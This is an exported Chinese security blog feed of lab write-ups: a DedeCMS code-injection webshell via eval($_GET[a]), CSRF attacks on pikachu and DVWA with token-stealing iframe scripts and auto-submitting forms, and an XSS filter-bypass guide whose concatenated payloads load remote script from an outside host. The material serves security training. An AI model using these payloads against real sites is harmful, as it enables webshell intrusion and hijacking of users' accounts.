<li>需要一个url中输入action，即getfiles</li>
<li>然后会打开一个cacheFile=DEDEDATA.’/modifytmp.inc文件</li>
<li>开始输入，发现包含了一个php的头</li>
<li>foreach输入然后进行replace，可以用反斜线双引号</li>
<li>涉及payload为：<code>http://localhost/dedecms/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\\&quot;;eval($_GET[a]);die();//</code></li>
</ul>
</li>
<li>这时候需要另外一个包含inc文件且能执行的，发现在后面的代码中，有一个通过action=down来执行，包含inc文件的，触发shell：<code>http://localhost/dedecms/uploads/dede/sys_verifies.php?action=down&amp;a=phpinfo();</code></li>
</ul>
<p><img src="/images/csrf/dedecms/csrf-code.png" srcset="/img/loading.gif" alt="csrf-code"></p>
<ul>
<li>信息收集一下，发现后台是/csrf/uploads/dede/login.php<ul>
<li>弱口令admin/admin123登陆成功</li>
<li>这时候浏览器应该有管理员的Cookie了</li>
</ul>
</li>
</ul>
<p><img src="/images/csrf/dedecms/csrf-login.png" srcset="/img/loading.gif" alt="csrf-login"></p>
<ul>
<li>payload尝试<ul>
<li>插入shell</li>
<li>执行shell</li>
<li>拿到phpinfo的信息</li>
<li>搜索ducument，发现网站根目录</li>
</ul>
</li>
</ul>
<p><img src="/images/csrf/dedecms/csrf-phpinfo.png" srcset="/img/loading.gif" alt="csrf-phpinfo"></p>
<ul>
<li>既然有了shell，读取一下网站根目录</li>
<li>payload<ul>
<li>继续使用action=down</li>
<li>写入dir的路径</li>
<li>scandir扫描路径</li>
<li>print打印输出所有的文件</li>
<li>action=down&amp;a=$dir=dirname(‘C:/phpStudy/WWW/csrf/uploads/‘);$file = scandir($dir);print_r($file);</li>
</ul>
</li>
</ul>
<p><img src="/images/csrf/dedecms/csrf-root.png" srcset="/img/loading.gif" alt="csrf-root"> </p>
<ul>
<li>既然有了路径，那就读取吧</li>
<li>payload：action=down&amp;a=readfile(‘C:/phpStudy/WWW/csrf/flag.php’);</li>
</ul>
<p><img src="/images/csrf/dedecms/csrf-flag.png" srcset="/img/loading.gif" alt="csrf-flag"></p>
<ul>
<li>留有疑问<ul>
<li>前面代码审计那里，payload的refiles[1]的绕过//“,是对什么的绕过？</li>
</ul>
</li>
</ul>
<h4 id="2-靶场说明"><a href="#2-靶场说明" class="headerlink" title="2. 靶场说明"></a>2. 靶场说明</h4><ul>
<li>⭐ 感谢白熊老哥提供的封神台靶场练习，跟真的在挖洞一样，难度倍增，收获也很多</li>
</ul>
]]></content>
      <categories>
        <category>CSRF</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF靶场--pikachu</title>
    <url>/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--pikachu/</url>
    <content><![CDATA[<hr>
<h4 id="1-CSRF-get"><a href="#1-CSRF-get" class="headerlink" title="1. CSRF(get)"></a>1. CSRF(get)</h4><ul>
<li>右上角的提示，发现有多个账号可以登陆</li>
<li>账号：vince/allen/kobe/grady/kevin/lucy/lili 密码：123456</li>
<li>选择vince/123456登陆</li>
<li>发现可以修改个人信息，既然是get的请求，那我bp抓包一下并修改</li>
<li>发觉数据都可以进行修改，还带了Cookie</li>
</ul>
<p><img src="/images/csrf/pikachu/csrf-get-data.png" srcset="/img/loading.gif" alt="csrf-get-data"></p>
<p><img src="/images/csrf/pikachu/csrf-get-change.png" srcset="/img/loading.gif" alt="csrf-get-change"></p>
<h4 id="2-CSRF-post"><a href="#2-CSRF-post" class="headerlink" title="2. CSRF(post)"></a>2. CSRF(post)</h4><ul>
<li>登陆进来，一样的账户，一样的界面，但不一样的，是抓包发现的，是post数据</li>
<li>一样的修改数据，一样的带了Cookie</li>
<li>▲ bp的proxy会返回200OK，Repeater会返回302，但是都修改成功</li>
</ul>
<p><img src="/images/csrf/pikachu/csrf-post-data.png" srcset="/img/loading.gif" alt="csrf-post-data"></p>
<p><img src="/images/csrf/pikachu/csrf-post-change.png" srcset="/img/loading.gif" alt="csrf-post-change"></p>
<h4 id="3-CSRF-Token"><a href="#3-CSRF-Token" class="headerlink" title="3. CSRF Token"></a>3. CSRF Token</h4><ul>
<li>登陆进来，一样的账户，一样的界面，又再一次抓包，发现这次是多了token</li>
<li>▲ 每次刷新，Token都不一样</li>
<li>只有在点击修改个人信息的时候，会去访问一个token_get_edit.php的页面，才会获得一个Token，且隐藏在一个hidden的表单中，这是可以利用的就是token_get_edit.php的页面</li>
</ul>
<p><img src="/images/csrf/pikachu/csrf-token.png" srcset="/img/loading.gif" alt="csrf-token"></p>
<ul>
<li>攻击思路<ul>
<li>同样找一个有XSS漏洞的页面，插入一个iframe：<code>&lt;iframe src=&quot;../csrf&quot;&gt;</code>，可能需要修改maxlength的长度</li>
<li>发现可以拿到hidden中的Token：698085e82ed2acb762985707895</li>
</ul>
</li>
</ul>
<p><img src="/images/csrf/pikachu/csrf-iframe.png" srcset="/img/loading.gif" alt="csrf-iframe"></p>
<ul>
<li>构造一个url：<a href="http://192.168.0.108/pikachu/vul/csrf/csrftoken/token_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=china&amp;email=vince%40pikachu.cn&amp;token=698085e82ed2acb762985707895&amp;submit=submit#" target="_blank" rel="noopener">http://192.168.0.108/pikachu/vul/csrf/csrftoken/token_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=china&amp;email=vince%40pikachu.cn&amp;token=698085e82ed2acb762985707895&amp;submit=submit#</a></li>
</ul>
<p><img src="/images/csrf/pikachu/csrf-token-pikachu.png" srcset="/img/loading.gif" alt="csrf-token-pikachu"></p>
<ul>
<li>成功修改</li>
<li>同样的，也能引用婷婷哈大佬的js代码文件去进行CSRF攻击</li>
</ul>
<h4 id="4-靶场说明"><a href="#4-靶场说明" class="headerlink" title="4. 靶场说明"></a>4. 靶场说明</h4><ul>
<li>pikachu的CSRF靶场还是相对容易的</li>
<li>无论是对于Referer头还是Token，都有一定的绕过方法</li>
<li>但更安全的是，验证当前的密码而不是Cookie</li>
</ul>
]]></content>
      <categories>
        <category>CSRF</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF靶场--dvwa</title>
    <url>/2020/04/02/CSRF%E9%9D%B6%E5%9C%BA--dvwa/</url>
    <content><![CDATA[<hr>
<h4 id="1-CSRF-Low"><a href="#1-CSRF-Low" class="headerlink" title="1. CSRF(Low)"></a>1. CSRF(Low)</h4><ul>
<li>发现没有确认码、输入当前密码以及Token</li>
<li>密码的传输也只通过URL传输</li>
<li>可以很容易的构造payload：<a href="http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#" target="_blank" rel="noopener">http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#</a></li>
<li>源码分析<ul>
<li>首先获取输入的两个密码然后判断两个值是否相等</li>
<li>若相等则接着对pass_new变量进行调用mysql_real_escape_string()函数来进行字符串的过滤</li>
<li>再调用md5()函数对输入的密码进行MD5加密</li>
<li>最后再将新密码更新到数据库中</li>
<li>▲ 整段代码因为调用了mysql_real_escape_string()函数从而有效地过滤了SQL注入，但是对CSRF没有任何的防御机制</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

if( isset( $_GET[ &#39;Change&#39; ] ) ) {
    // Get input
    $pass_new  = $_GET[ &#39;password_new&#39; ];
    $pass_conf = $_GET[ &#39;password_conf&#39; ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;
        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );

        // Feedback for the user
        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
    }
    else {
        // Issue with passwords matching
        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
}

?&gt; </code></pre><h4 id="2-CSRF-Medium"><a href="#2-CSRF-Medium" class="headerlink" title="2. CSRF(Medium)"></a>2. CSRF(Medium)</h4><ul>
<li>先改变账号的密码test123，发现没问题</li>
<li>尝试用一下Low级别的payload：<a href="http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#" target="_blank" rel="noopener">http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#</a></li>
<li>发现弹出错误</li>
</ul>
<p><img src="/images/csrf/dvwa/csrf-http_referer.png" srcset="/img/loading.gif" alt="csrf-http_referer"></p>
<ul>
<li>F12打开网络，查看消息头，发现Referer是一个网络地址</li>
</ul>
<p><img src="/images/csrf/dvwa/csrf-network.png" srcset="/img/loading.gif" alt="csrf-network"></p>
<ul>
<li>打开Burpsuite，抓取一个请求包，往请求头里面添加一个Referer，Referer头内容为Host字段内容，即可看到修改密码成功<ul>
<li>▲ 2020.03.31 HackBar尝试失败，无法正常带上一个Referer</li>
<li>▲ 127.0.0.1的Referer头无法修改密码</li>
</ul>
</li>
</ul>
<p><img src="/images/csrf/dvwa/csrf-bp.png" srcset="/img/loading.gif" alt="csrf-bp"></p>
<ul>
<li>源码分析<ul>
<li>在Low级别的基础上，添加了对Referer头的判断，是否包含了Host字段的内容</li>
<li>HTTP_REFERER与SERVER_NAME的stripos()函数判断</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

if( isset( $_GET[ &#39;Change&#39; ] ) ) {
    // Checks to see where the request came from
    if( stripos( $_SERVER[ &#39;HTTP_REFERER&#39; ] ,$_SERVER[ &#39;SERVER_NAME&#39; ]) !== false ) {
        // Get input
        $pass_new  = $_GET[ &#39;password_new&#39; ];
        $pass_conf = $_GET[ &#39;password_conf&#39; ];

        // Do the passwords match?
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
            $pass_new = md5( $pass_new );

            // Update the database
            $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;
            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );

            // Feedback for the user
            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
        }
        else {
            // Issue with passwords matching
            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
        }
    }
    else {
        // Didn&#39;t come from a trusted source
        echo &quot;&lt;pre&gt;That request didn&#39;t look correct.&lt;/pre&gt;&quot;;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
}

?&gt; </code></pre><h4 id="3-CSRF-High"><a href="#3-CSRF-High" class="headerlink" title="3. CSRF(High)"></a>3. CSRF(High)</h4><ul>
<li>先改变账号的密码test123，发现URL地址中多出了一个user_token：<a href="http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test123&amp;password_conf=test123&amp;Change=Change&amp;user_token=87d4d22790311704b656dff9308ec73a#" target="_blank" rel="noopener">http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test123&amp;password_conf=test123&amp;Change=Change&amp;user_token=87d4d22790311704b656dff9308ec73a#</a></li>
<li>且每次修改密码，token都会发生变化，暂时无法破解</li>
<li>▲ 以下答案来自婷婷哈大佬的解题–CSRF结合XSS漏洞<ul>
<li>要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token，试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击</li>
<li>攻击思路<ul>
<li>当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击</li>
<li>▲ 然而现实中有跨域问题，而现在的浏览器是不允许跨域请求的，只能将击代码注入到目标服务器中，才有可能完成攻击</li>
</ul>
</li>
</ul>
</li>
<li>攻击实现<ul>
<li>找到一个有XSS漏洞的站点，这里选择XSS(stored)（同源站点，不然受同源策略影响）</li>
<li>在name中修改maxlength的长度，并注入能利用的代码： <code>&lt;iframe src=&quot;../csrf&quot;&gt;</code></li>
<li>提交后会返回一个包含csrf的页面，里面有存在user_token的值：d915919e613a4e8f9f1ab750f23571f0</li>
<li>构造payload：<a href="http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change&amp;user_token=d915919e613a4e8f9f1ab750f23571f0#" target="_blank" rel="noopener">http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change&amp;user_token=d915919e613a4e8f9f1ab750f23571f0#</a></li>
<li>成功修改密码</li>
<li>▲ 也可用此代码：<code>&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElenentsByName(&#39;user_token&#39;)[0].value)&gt;</code></li>
</ul>
</li>
</ul>
<p><img src="/images/csrf/dvwa/csrf-token-dvwa.png" srcset="/img/loading.gif" alt="csrf-token-dvwa"></p>
<ul>
<li>下面为婷婷哈大佬写的js文件，用于修改密码，在这基础上，将js文件在XSS平台编辑，然后找到一个有XSS漏洞的站点，修改URL发给受害者</li>
</ul>
<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
function attack(){

    document.getElementsByName(&#39;user_token&#39;)[0].value=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(&#39;user_token&#39;)[0].value;

    document.getElementById(&quot;transfer&quot;).submit();
}
&lt;/script&gt;

&lt;iframe src=&quot;http://192.168.0.109/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;
&lt;/iframe&gt;

&lt;body onload=&quot;attack()&quot;&gt;

&lt;form method=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://192.168.0.109/dvwa/vulnerabilities/csrf&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;user_token&quot; value=&quot;&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;
&lt;/form&gt;
&lt;/body&gt;</code></pre><ul>
<li>源码分析<ul>
<li>在Low级别的基础上，增加了对Session中session_token的判断，且一次随机性</li>
<li>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

if( isset( $_GET[ &#39;Change&#39; ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );

    // Get input
    $pass_new  = $_GET[ &#39;password_new&#39; ];
    $pass_conf = $_GET[ &#39;password_conf&#39; ];

    // Do the passwords match?
    if( $pass_new == $pass_conf ) {
        // They do!
        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
        $pass_new = md5( $pass_new );

        // Update the database
        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;
        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );

        // Feedback for the user
        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
    }
    else {
        // Issue with passwords matching
        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?&gt; </code></pre><h4 id="4-CSRF-Impossible"><a href="#4-CSRF-Impossible" class="headerlink" title="4. CSRF(Impossible)"></a>4. CSRF(Impossible)</h4><ul>
<li>impossible级修改密码的界面是需要通过三次输入，即增加了输入当前密码的项，从而能够进行相应的身份认证</li>
<li>源码分析<ul>
<li>增加了一个对当前密码的确认，基本无绕过方式（▲ 你知道密码了还改个锤子）</li>
</ul>
</li>
</ul>
<pre><code>&lt;?php

if( isset( $_GET[ &#39;Change&#39; ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );

    // Get input
    $pass_curr = $_GET[ &#39;password_current&#39; ];
    $pass_new  = $_GET[ &#39;password_new&#39; ];
    $pass_conf = $_GET[ &#39;password_conf&#39; ];

    // Sanitise current password input
    $pass_curr = stripslashes( $pass_curr );
    $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
    $pass_curr = md5( $pass_curr );

    // Check that the current password is correct
    $data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );
    $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );
    $data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR );
    $data-&gt;execute();

    // Do both new passwords match and does the current password match the user?
    if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {
        // It does!
        $pass_new = stripslashes( $pass_new );
        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
        $pass_new = md5( $pass_new );

        // Update database with new password
        $data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; );
        $data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR );
        $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR );
        $data-&gt;execute();

        // Feedback for the user
        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
    }
    else {
        // Issue with passwords matching
        echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;;
    }
}

// Generate Anti-CSRF token
generateSessionToken();
?&gt; </code></pre><h4 id="5-CSRF的三种payload形式"><a href="#5-CSRF的三种payload形式" class="headerlink" title="5. CSRF的三种payload形式"></a>5. CSRF的三种payload形式</h4><ul>
<li>▲ 本节内容来自部分来自婷婷哈大佬和部分来自bmjoker大佬</li>
<li>构造链接 <ul>
<li><a href="http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#" target="_blank" rel="noopener">http://192.168.0.109/dvwa/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#</a></li>
<li>当受害者点击了这个链接，他的密码就会被改成test</li>
<li>▲ CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面</li>
</ul>
</li>
<li>使用短链接来隐藏URL<ul>
<li>如<a href="http://dwz.cn/" target="_blank" rel="noopener">http://dwz.cn/</a>….</li>
<li>实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的.</li>
<li>但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也不适合现实生活</li>
</ul>
</li>
<li>构造攻击页面<ul>
<li>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成</li>
<li>当受害者访问攻击页面时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改了</li>
</ul>
</li>
</ul>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
    &lt;form action=&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/&quot;&gt;
        &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;hacker&quot;&gt;
        &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;hacker&quot;&gt;
        &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;
        &lt;input type=&quot;submit&quot; value=&quot;Click Me&quot;&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h4 id="6-靶场说明"><a href="#6-靶场说明" class="headerlink" title="6. 靶场说明"></a>6. 靶场说明</h4><ul>
<li>dvwa的CSRF靶场是相对容易的</li>
<li>无论是对于Referer头还是Token，都有一定的绕过方法</li>
<li>但更安全的是，验证当前的密码而不是Cookie</li>
</ul>
]]></content>
      <categories>
        <category>CSRF</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS--手工挖掘方法论</title>
    <url>/2020/04/02/XSS--%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95%E8%AE%BA/</url>
    <content><![CDATA[<hr>
<h4 id="1-编码绕过"><a href="#1-编码绕过" class="headerlink" title="1. 编码绕过"></a>1. 编码绕过</h4><ul>
<li>URL编码<ul>
<li>URL只允许用US-ASCII字符集中可打印的字符(0×20—0x7x)</li>
<li>编码方式：字符改成%+ASCII两位十六进制(先把字符串转成ASCII编码，然后再转成十六进制)</li>
<li>+加号代表URL编码的空格，%20也是</li>
<li>&amp;-&gt; %26, # -&gt; %23</li>
</ul>
</li>
<li>Unicode编码<ul>
<li>javascript支持unicode、escapes、十六进制、八进制等编码形式</li>
<li>&lt;不光可以写为\u003c，还可以写为\x3c，&gt;同样可以写为\x3e，空格可以表示为\u0020</li>
</ul>
</li>
<li>html编码<ul>
<li>编码方式：&amp;#加十进制、十六进制ASCII码或unicode字符编码</li>
<li>浏览器解析的时候会先把html编码解析再进行渲染</li>
<li>▲ 编码必须在”值”里，比如属性src里，但却不能对src进行html编码。不然浏览器无法正常的渲染</li>
</ul>
</li>
<li>CSS编码<ul>
<li>编码方式：/斜杠加上1-6位十六进制</li>
<li>\ 反斜线，而css里，允许使用转义字符，+ascii16进制形式</li>
<li>▲ IE5之前都可以用expression来调用js时</li>
</ul>
</li>
</ul>
<h4 id="2-空格-回车-Tab"><a href="#2-空格-回车-Tab" class="headerlink" title="2. 空格/回车/Tab"></a>2. 空格/回车/Tab</h4><ul>
<li><code>&lt;img src= &quot;java　　script:alert(&#39;xss&#39;);&quot; width=100&gt;</code></li>
<li>Javascript通常以分号结尾，如果不是完整的语句，javascript则会继续处理，直到语句完整结束或分号</li>
</ul>
<h4 id="3-改变大小写与重复标签"><a href="#3-改变大小写与重复标签" class="headerlink" title="3. 改变大小写与重复标签"></a>3. 改变大小写与重复标签</h4><ul>
<li><code>&lt;ScRipt&gt;ALeRt(&quot;XSS&quot;);&lt;/sCRipT&gt;</code></li>
<li><code>&lt;scr&lt;script&gt;ipt&gt;alert(&quot;xss&quot;)&lt;/scr&lt;/script&gt;ipt&gt;</code></li>
</ul>
<h4 id="4-宽字节绕过"><a href="#4-宽字节绕过" class="headerlink" title="4. 宽字节绕过"></a>4. 宽字节绕过</h4><ul>
<li>gbxxxx系列的编码 / 过滤：%22 -&gt; %5c%22（\ -&gt; 转义：\）</li>
<li>%c0%22 -&gt; %c0%5c%22 -&gt; %22 -&gt; %c0吃掉%5c</li>
</ul>
<h4 id="5-绕过magic-quotes-gpc"><a href="#5-绕过magic-quotes-gpc" class="headerlink" title="5. 绕过magic_quotes_gpc"></a>5. 绕过magic_quotes_gpc</h4><ul>
<li>magic_quotes_gpc=ON是php中的安全设置，开启后把一些特殊字符进行轮换，比如’(单引号)转换为&#39;，”(双引号)转换为&quot;，\转换为\</li>
<li>例如：<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>转换为<code>&lt;script&gt;alert(\&quot;xss\&quot;)&lt;/script&gt;</code></li>
<li>针对开启了magic_quotes_gpc的网站，我们可以通过JavaScript中的String.formCharCode方法来绕过，我们可以把alert(“xss”);转换为(97,108,101,114,116,40,34,88,83,34,41,59)</li>
<li>▲ String.formCharCode()是javascript中的字符串方法，用来把ASCII转换为字符串</li>
</ul>
<h4 id="6-解决限制字符（要求同页面）"><a href="#6-解决限制字符（要求同页面）" class="headerlink" title="6. 解决限制字符（要求同页面）"></a>6. 解决限制字符（要求同页面）</h4><ul>
<li>▲ 绕过限制字符长度<code>&lt;!--</code></li>
<li>分单元，最后通过eval()函数去拼接，详细过程可看云服务器的Bilibili的存储型XSS</li>
<li>script标签拼接<ul>
<li><code>&lt;script&gt;z=&#39;document.&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;write(&quot;&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;&lt;script&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39; src=ht&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;tp://ww&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;w.shell&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;.net/1.&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;js&gt;&lt;/sc&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;z=z+&#39;ript&gt;&quot;)&#39;&lt;/script&gt;</code></li>
<li><code>&lt;script&gt;eval_r(z)&lt;/script&gt;</code></li>
</ul>
</li>
<li>svg标签拼接<ul>
<li><code>&lt;svg onload=a=&#39;document.writ&#39;&gt;</code></li>
<li><code>&lt;svg onload=b=&#39;e(String.from&#39;&gt;</code></li>
<li><code>&lt;svg onload=c=&#39;CharCode(60,1&#39;&gt;</code></li>
<li><code>&lt;svg onload=d=&#39;15,99,114,105&#39;&gt;</code></li>
<li><code>&lt;svg onload=e=&#39;,112,116,32,1&#39;&gt;</code></li>
<li><code>&lt;svg onload=f=&#39;15,114,99,61,&#39;&gt;</code></li>
<li><code>&lt;svg onload=g=&#39;39,104,116,11&#39;&gt;</code></li>
<li><code>&lt;svg onload=h=&#39;6,112,58,47,4&#39;&gt;</code></li>
<li><code>&lt;svg onload=i=&#39;7,116,46,99,1&#39;&gt;</code></li>
<li><code>&lt;svg onload=j=&#39;10,47,82,52,8&#39;&gt;</code></li>
<li><code>&lt;svg onload=k=&#39;6,84,75,53,66&#39;&gt;</code></li>
<li><code>&lt;svg onload=l=&#39;,39,62,60,47,&#39;&gt;</code></li>
<li><code>&lt;svg onload=m=&#39;115,99,114,10&#39;&gt;</code></li>
<li><code>&lt;svg onload=n=&#39;5,112,116,62)&#39;&gt;</code></li>
<li><code>&lt;svg onload=o=&#39;);&#39;&gt;</code></li>
<li><code>&lt;svg onload=x=a+b+n+d+e+f+g+h&gt;</code></li>
<li><code>&lt;svg onload=t=i+j+k+l+m+n+o&gt;</code></li>
